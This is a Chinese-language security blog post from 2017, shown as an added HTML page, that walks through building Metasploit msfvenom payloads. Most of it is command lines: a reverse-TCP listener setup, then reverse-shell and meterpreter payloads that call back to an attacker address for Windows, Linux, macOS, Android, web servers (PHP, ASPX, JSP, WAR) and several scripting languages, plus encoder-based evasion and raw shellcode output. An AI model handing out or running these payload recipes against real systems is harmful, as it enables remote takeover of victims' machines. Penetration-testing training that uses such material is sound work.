@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="msfvenom 进阶 [暂未完...]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>msfvenom 进阶 [暂未完...] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/03/08/msfvenom-advanced/">
+                msfvenom 进阶 [暂未完...]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-03-08</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/msfvenom/">msfvenom</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>0x01 msfvenom 常规选项用途:<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">l  列出所有可用的payload,编码器,空指令……</span></div><div class="line">-<span class="ruby">p  指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的</span></div><div class="line">-<span class="ruby">f  指定payload输出的文件类型,--help-formats,可查看支持的所有输出格式</span></div><div class="line">-<span class="ruby">e  指定要使用那种编码器</span></div><div class="line">-<span class="ruby">i  指定编码的次数,如果使用编码器</span></div><div class="line">-<span class="ruby">b  指定坏字符,比如空字符截断问题,等等……</span></div><div class="line">-<span class="ruby">x  使用一个自定义可执行程序模板,并将payload嵌入其中</span></div><div class="line">-<span class="ruby">k  当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用</span></div><div class="line">-<span class="ruby">o  指定创建好的payload的存放位置</span></div></pre></td></tr></table></figure></p>
+<p>0x02 首先,创建好监听器,等待shell回连,务必注意,创建什么类型的payload就要用什么类型的监听器来接收,必须一一对应,此处就以最普通的tcp监听器为例<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler</div><div class="line">msf &gt; <span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></div><div class="line">msf <span class="comment">&gt; set lport 443</span></div><div class="line">msf <span class="comment">&gt; set lhost 192.168.3.12</span></div><div class="line">msf <span class="comment">&gt; exploit -j</span></div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>0x03 实例创建各类系统平台下的payload:</p>
+<p>windows 平台,普通的exe 直接双击即可触发,会弹回一个常规meterpreter<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom -a <span class="keyword">x</span><span class="number">86</span> --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">3.12</span> LPORT=<span class="number">443</span> -e <span class="keyword">x</span><span class="number">86</span>/shikata_ga_nai -b '\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">0</span>a\xff' -i <span class="number">3</span> -f exe -o <span class="keyword">x</span><span class="number">86</span>_shell.exe</div></pre></td></tr></table></figure></p>
+<p>powershell,把文件中编码后的powershell payload代码直接抠出来,丢到目标机器的cmd中去执行触发,会弹回一个powershell的shell<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.3</span><span class="number">.12</span> LPORT=<span class="number">443</span> -e cmd/powershell_base64 -i <span class="number">3</span> -f raw -o x86_shell.ps1</div></pre></td></tr></table></figure></p>
+<p>linux 平台,直接赋予执行权限,执行即可触发,关于如何将payload嵌入deb或者rpm包中,我们后续再单独说<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.3</span><span class="number">.12</span> LPORT=<span class="number">443</span> -f elf -o x86_shell</div></pre></td></tr></table></figure></p>
+<p>mac 平台,暂没实际测试<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.3</span><span class="number">.12</span> LPORT=<span class="number">443</span> -f macho -o x86_shell.macho</div></pre></td></tr></table></figure></p>
+<p>android平台 注意这里生成的apk是不能直接被装到手机上的,还需要你自己给apk签个名才能装,装完以后点击打开即可触发,关于如何向正常的app中嵌入msf的payload后期也会单独再说明<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.3</span><span class="number">.12</span> LPORT=<span class="number">443</span> -f apk -o x86_shell.apk</div></pre></td></tr></table></figure></p>
+<p>基于各类web脚本,对于此类的web脚本触发执行方法非常简单,直接在url中访问该脚本即可</p>
+<p>php 脚本<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom --platform PHP -p php/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.3</span><span class="number">.12</span> LPORT=<span class="number">443</span> -f raw -o x86_shell.php</div></pre></td></tr></table></figure></p>
+<p>aspx 脚本<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.3</span><span class="number">.12</span> LPORT=<span class="number">443</span> -f aspx -o x86_shell.aspx</div></pre></td></tr></table></figure></p>
+<p>jsp 脚本<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.3</span><span class="number">.12</span> LPORT=<span class="number">443</span> -f raw -o x86_shell.jsp</div></pre></td></tr></table></figure></p>
+<p>war包,找个能部署war包的地方,如各类java控制台,部署一下即可执行<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.3</span><span class="number">.12</span> LPORT=<span class="number">443</span> -f raw -o x86_shell.war</div></pre></td></tr></table></figure></p>
+<p>基于其它各类脚本的payload,说几个实战中可能会碰到的语言环境</p>
+<p>nodejs<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom -p nodejs/shell_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.3</span><span class="number">.12</span> LPORT=<span class="number">443</span> -f raw -o x86_shell.js</div></pre></td></tr></table></figure></p>
+<p>python<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom -p python/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.3</span><span class="number">.12</span> LPORT=<span class="number">443</span> -f raw -o x86_shell.py</div></pre></td></tr></table></figure></p>
+<p>perl<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom -p cmd/unix/reverse_perl LHOST=<span class="number">192.168</span><span class="number">.3</span><span class="number">.12</span> LPORT=<span class="number">443</span> -f raw -o x86_shell.pl</div></pre></td></tr></table></figure></p>
+<p>ruby<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom -p ruby/shell_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.3</span><span class="number">.12</span> LPORT=<span class="number">443</span> -f raw -o x86_shell.rb</div></pre></td></tr></table></figure></p>
+<p>lua<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom -p cmd/unix/reverse_lua LHOST=<span class="number">192.168</span><span class="number">.3</span><span class="number">.12</span> LPORT=<span class="number">443</span> -f raw -o x86_shell.lua</div></pre></td></tr></table></figure></p>
+<p>0x04 利用wireshark观察不同协议下的payload的运作细节:</p>
+<p>bind类型<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">windows<span class="regexp">/meterpreter/</span>bind_tcp</div><div class="line">windows<span class="regexp">/meterpreter/</span>bind_tcp_rc4</div><div class="line">windows<span class="regexp">/meterpreter/</span>bind_hidden_tcp</div></pre></td></tr></table></figure></p>
+<p>reverse类型<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">windows<span class="regexp">/meterpreter/</span>reverse_tcp</div><div class="line">windows<span class="regexp">/meterpreter/</span>reverse_tcp_dns</div><div class="line">windows<span class="regexp">/meterpreter/</span>reverse_tcp_rc4</div><div class="line">windows<span class="regexp">/meterpreter/</span>reverse_tcp_rc4_dns</div><div class="line">windows<span class="regexp">/meterpreter/</span>reverse_http</div><div class="line">windows<span class="regexp">/meterpreter/</span>reverse_https</div></pre></td></tr></table></figure></p>
+<p>32位<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">windows<span class="regexp">/meterpreter/</span>bind_tcp</div></pre></td></tr></table></figure></p>
+<p>64位<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">windows<span class="regexp">/x64/m</span>eterpreter<span class="regexp">/reverse_tcp</span></div></pre></td></tr></table></figure></p>
+<p>0x05 生成不同平台下的shellcode</p>
+<p>win平台shellcode<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.3</span><span class="number">.12</span> LPORT=<span class="number">443</span> -f c</div></pre></td></tr></table></figure></p>
+<p>linux平台shellcode<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.3</span><span class="number">.12</span> LPORT=<span class="number">443</span> -f c</div></pre></td></tr></table></figure></p>
+<p>mac平台shellcode<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.3</span><span class="number">.12</span> LPORT=<span class="number">443</span> -f c</div></pre></td></tr></table></figure></p>
+<p>0x06 将普通类型的shell升级为meterpreter:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">post<span class="regexp">/multi/m</span>anage<span class="regexp">/shell_to_meterpreter</span></div></pre></td></tr></table></figure></p>
+<p><br><br>后话:<br>&nbsp;&nbsp;&nbsp;只匆忙地写了一小半,实在太困了,抽空再续…抱歉</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/msfvenom/">#msfvenom</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
